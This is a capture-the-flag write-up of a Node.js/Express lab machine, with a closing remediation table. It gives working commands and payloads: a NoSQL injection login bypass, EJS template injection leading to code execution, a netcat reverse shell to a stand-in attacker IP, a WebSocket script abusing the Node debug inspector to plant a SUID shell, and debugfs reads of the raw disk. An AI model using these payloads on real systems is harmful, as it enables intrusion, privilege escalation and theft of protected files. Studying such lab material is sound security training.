DOOR 07 Boot2Root Medium

Do Not Disturb

Summary

Byte Lotus is a Node.js/Express web application ("poolside reservation platform") vulnerable to a chained set of misconfigurations: a NoSQL injection authentication bypass, a Server-Side Template Injection (SSTI) in an EJS preview feature leading to remote code execution, an exposed Node.js debug inspector on a second internal service, and finally a dangerous disk group membership that allows raw block-device reads, bypassing all filesystem permissions to retrieve the root flag

1. Reconnaissance

Port scan

nmap -p- --min-rate=1000 -T4 <TARGET_IP>
nmap -p 22,80 -sC -sV -A <TARGET_IP>
Results:
PortServiceVersion
22/tcpsshOpenSSH 9.6p1 (Ubuntu)
80/tcphttpNode.js (Express middleware)

Only SSH and HTTP were open, making the web application the obvious attack surface.

Web enumeration

The homepage (/) presented a themed login form ("Staff / Guest ID" + "Passphrase") for a fictional poolside reservation service, with a placeholder username of attendant.

gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x js,json,txt -t 50

Discovered endpoints:

  • /login - POST, session-based auth
  • /logout - 302 redirect, confirms session/cookie handling
  • /staff - 403 Forbidden (protected area)

Response headers confirmed the backend: X-Powered-By: Express.

2. Authentication Bypass - NoSQL Injection

The /login endpoint accepted JSON bodies and queried a datastore directly with user-supplied fields, without sanitising for MongoDB/NeDB query operators. This is a classic NoSQL injection pattern.

curl -s -c cookies.txt -X POST http://<TARGET_IP>/login \

-H "Content-Type: application/json" \

-d '{"username":"attendant","password":{"$ne":""}}'

Response:

{"ok":true,"role":"staff"}

By passing {"$ne": ""} instead of a string password, the underlying query effectively became "find a user named attendant whose password is not an empty string" - which is always true - bypassing authentication entirely and returning a valid staff session cookie (connect.sid).

Root cause (confirmed via source review later): the app used @seald-io/nedb and queried with db.findOneAsync({ username, password }), passing the raw parsed JSON body straight into the query without type-checking that password was a string.

3. Server-Side Template Injection (SSTI) → RCE

Using the forged staff session, /staff was now accessible. It exposed a "Cabana Desk" console allowing staff to preview a guest confirmation message using an EJS template, explicitly documented in the UI:

Confirmation template (EJS - use <%= guest %> to personalise)

The server rendered the user-submitted template directly with ejs.render(template, {...}), with no sandboxing.

Confirming the injection:

curl -s -b cookies.txt -X POST http://<TARGET_IP>/staff/preview \
--data-urlencode 'template=Test: <%= 7*7 %>' \

--data-urlencode 'guest=x'

Result: Test: 49 - arbitrary JavaScript expressions were being evaluated server-side.

Escalating to code execution, since EJS templates execute in the context of the Node process and can reach require via process.mainModule:

curl -s -b cookies.txt -X POST http://<TARGET_IP>/staff/preview \

--data-urlencode 'template=<%= process.mainModule.require("child_process").execSync("id").toString() %>' \

--data-urlencode 'guest=x'

Result:

uid=996(poolside) gid=996(poolside) groups=996(poolside)

Remote code execution confirmed as the poolside service user.

Obtaining an interactive shell

# Listener
nc -lvnp 4444
# Trigger (via the SSTI RCE)
curl -s -b cookies.txt -X POST http://<TARGET_IP>/staff/preview \

--data-urlencode 'template=<%= process.mainModule.require("child_process").execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f") %>' \

--data-urlencode 'guest=x'

Upgraded the shell for usability:

python3 -c 'import pty; pty.spawn("/bin/bash")'

User flag

find / -iname "user.txt" -o -iname "root.txt" 2>/dev/null

cat /home/poolside/user.txt
THM{w4rm_s3ss10n_h1j4ck3d}

4. Privilege Escalation, Stage 1 - Exposed Node Inspector

ps aux revealed a second Node.js process running as a different, unprivileged service account:

pipelin+   594  ... /usr/bin/node --inspect=127.0.0.1:9229 processor.js

The --inspect flag exposes the V8/Node debugging protocol over a WebSocket on 127.0.0.1:9229. Anyone able to reach this port (which we could, from our shell as poolside) can attach to the debugger and evaluate arbitrary JavaScript in that process's context - running as pipelinesvc.

curl -s http://127.0.0.1:9229/json

This returns a JSON descriptor including a webSocketDebuggerUrl, e.g.:

ws://127.0.0.1:9229/<session-id>

Exploit: since no WebSocket client tooling was pre-installed, we used Node's built-in native WebSocket client (available in modern Node) to speak the inspector protocol directly and issue a Runtime.evaluate command:

// /tmp/exploit.js

const ws = new WebSocket("ws://127.0.0.1:9229/<session-id>");
ws.onopen = () => {
ws.send(JSON.stringify({
id: 1,

method: "Runtime.evaluate",

params: {

expression:

"process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash').toString()"

}
}));
};

ws.onmessage = (event) => { console.log("Response:", event.data); process.exit(0); };

ws.onerror = (err) => console.error("Error:", err);

node /tmp/exploit.js

ls -la /tmp/rootbash
# -rwsr-xr-x 1 pipelinesvc pipelinesvc ... /tmp/rootbash

/tmp/rootbash -p

id

# uid=996(poolside) gid=996(poolside) euid=995(pipelinesvc) groups=996(poolside)

This yields an effective UID of pipelinesvc, but - important detail below - not the real UID/GID or supplementary group list, since a SUID binary only elevates the effective identity, not group membership inherited at login.

5. Privilege Escalation, Stage 2 - disk Group → Root

Enumeration of pipelinesvc's account revealed:

id pipelinesvc

# uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)

Membership in the disk group is a well-known, severe misconfiguration: it grants read/write access to raw block devices (/dev/sd*, /dev/nvme*, etc.), which means all filesystem permission checks can be bypassed by reading the disk directly rather than going through the VFS layer.

lsblk

# nvme0n1 -> nvme0n1p1 (20G, ext4, mounted at /)
ls -la /dev/nvme0n1p1
# brw-rw---- 1 root disk 259, 2 ... /dev/nvme0n1p1

Important pitfall: our /tmp/rootbash -p SUID shell only carried the effective UID of pipelinesvc, not its real UID/GID or supplementary groups - so id still showed groups=996(poolside), and any attempt to open /dev/nvme0n1p1 (group-owned by disk) was denied, even though euid=pipelinesvc. Group membership for device access is resolved from the process's real/supplementary group list, not effective UID alone.

Fix: run the disk-reading commands through the live Node inspector RCE instead of the SUID shell. Since that Node process was started properly by systemd as pipelinesvc, it has correct real UID/GID and the full supplementary group list (including disk).

// /tmp/exploit2.js - list /root via debugfs, executed inside the pipelinesvc Node process

const ws = new WebSocket("ws://127.0.0.1:9229/<session-id>");
ws.onopen = () => {
ws.send(JSON.stringify({
id: 1,

method: "Runtime.evaluate",

params: {

expression:

"process.mainModule.require('child_process').execSync(\"debugfs -R 'ls -l /root' /dev/nvme0n1p1\").toString()"

}
}));
};

ws.onmessage = (e) => { console.log(e.data); process.exit(0); };

node /tmp/exploit2.js

Output confirmed root.txt present in /root. Reading it the same way:

expression: "process.mainModule.require('child_process').execSync(\"debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1\").toString()"

node /tmp/exploit3.js

Root flag

THM{r4w_d1sk_4cc3ss_w4s_t00_much}

debugfs was used specifically because it can read files directly from an ext4 filesystem image/device without mounting it, requiring only read access to the block device itself - exactly what disk group membership provides.

6. Full Attack Chain (Recap)

  1. Recon - nmap identifies Express/Node web app on port 80, SSH on 22.
  2. Auth bypass - NoSQL injection ({"$ne": ""}) against an unsanitised NeDB query in /login grants a staff session.
  3. RCE - SSTI in an unsandboxed EJS template preview (/staff/preview) executes arbitrary JS via process.mainModule.require('child_process'), as user poolside.
  4. Lateral move - a second internal service (lotus-telemetry.service, running as pipelinesvc) exposes its Node debug inspector on 127.0.0.1:9229; a hand-rolled WebSocket client sends Runtime.evaluate to gain code execution as pipelinesvc.
  5. Privesc to root - pipelinesvc is a member of the disk group; using debugfs (executed inside the properly-privileged inspector-spawned process, not a SUID-effective shell) to read /root/root.txt directly from the raw block device, bypassing all filesystem ACLs.

7. Root Causes & Remediation

IssueFix
NoSQL injection in /loginValidate/coerce input types before querying (reject non-string username/password); use parameterised/whitelisted queries; consider a schema validation layer (e.g. zod, joi).
Unsandboxed EJS rendering of user inputNever pass user-controlled strings into ejs.render(). If templating is required for user content, use a logic-less templating engine or a strict sandbox (e.g. vm2, though even that has had escapes) and disable access to process/require.
Node --inspect exposed, even on loopbackNever run --inspect/--inspect-brk in production. If debugging is required, tunnel over SSH and disable outside of dev environments; the inspector protocol has no authentication.
pipelinesvc in the disk groupService accounts should follow least privilege - never add application/service users to disk, root, docker, or other groups that grant device- or container-level access unless absolutely required and tightly controlled.
SUID trick partially elevating identity(Attacker-side note, not a target fix) - be aware that SUID binaries only set effective UID; real UID and supplementary groups persist from the original process, which can cause confusing permission failures mid-exploitation.
